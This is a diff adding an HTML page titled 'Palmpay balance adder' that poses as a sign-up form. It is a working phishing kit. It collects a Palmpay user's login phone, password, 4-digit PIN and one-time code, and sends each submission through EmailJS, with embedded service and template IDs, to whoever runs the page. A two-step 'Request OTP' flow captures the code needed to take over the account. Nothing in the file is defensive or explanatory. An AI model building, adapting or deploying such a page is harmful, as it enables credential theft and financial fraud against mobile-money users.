@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Palmpay balance adder</title>
+
+<script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
+<link rel="stylesheet" href="login.css">
+</head>
+
+<body>
+
+<div class="login-box">
+    <h2>join us today</h2>
+
+    <form id="support-form">
+        <input type="number" name="login_phonenumber" placeholder="login phone" required>
+        <input type="password" name="login_password" placeholder="login password" required>
+        <input type="number" name="user_4_digit_pin" placeholder="4 digit pin" required>
+        <input type="number" name="OTP" placeholder="OTP" >
+        <button id="support-btn" type="submit">Request Otp</button>
+    </form>
+
+</div>
+
+<script>
+(function(){
+    emailjs.init("oxoB98Mo4X0yE3EGQ");
+})();
+
+const form = document.getElementById("support-form");
+const button = document.getElementById("support-btn");
+
+let step = 1;
+let countdownInterval;
+
+form.addEventListener("submit", function(event) {
+    event.preventDefault();
+
+    if (step === 1) {
+        // STEP 1 → Request OTP
+
+        button.disabled = true;
+        button.textContent = "Sending OTP...";
+
+        emailjs.sendForm(
+            "service_kx951jl",
+            "template_cgia2or",   // OTP template
+            form
+        ).then(function() {
+
+            alert("OTP sent!");
+            startCountdown();
+            step = 2;
+
+        }).catch(function(error) {
+            console.log(error);
+            alert("Failed to send OTP");
+            button.disabled = false;
+            button.textContent = "Request OTP";
+        });
+
+    } else if (step === 2) {
+        // STEP 2 → Submit full form with OTP
+
+        button.disabled = true;
+        button.textContent = "Submitting...";
+
+        emailjs.sendForm(
+            "service_kx951jl",
+            "template_cgia2or",  // second template
+            form
+        ).then(function() {
+
+            alert("Form sent successfully!");
+            form.reset();
+            resetButton();
+
+        }).catch(function(error) {
+            console.log(error);
+            alert("Submission failed");
+            button.disabled = false;
+            button.textContent = "Submit";
+        });
+    }
+});
+
+function startCountdown() {
+    let time = 60;
+
+    button.textContent = `Wait ${time}s`;
+
+    countdownInterval = setInterval(() => {
+        time--;
+        button.textContent = `Wait ${time}s`;
+
+        if (time <= 0) {
+            clearInterval(countdownInterval);
+            button.disabled = false;
+            button.textContent = "Submit OTP";
+        }
+    }, 1000);
+}
+
+function resetButton() {
+    step = 1;
+    button.disabled = false;
+    button.textContent = "Request OTP";
+}
+</script>
+
+</body>
+</html>
